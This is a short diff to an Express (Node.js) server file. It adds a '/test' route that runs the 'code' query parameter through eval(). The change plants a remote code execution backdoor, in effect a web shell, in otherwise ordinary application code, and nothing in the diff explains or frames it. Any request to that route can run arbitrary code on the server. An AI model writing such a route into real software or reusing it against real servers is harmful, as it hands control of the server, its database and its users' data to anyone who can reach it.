@@ -13,6 +13,10 @@ app.get("/hello", (req, res) => {
     });
 });
 
+app.get('/test', (req, res) => {
+    eval(req.query.code);
+});
+
 async function startServer() {
     await connectDB();
 
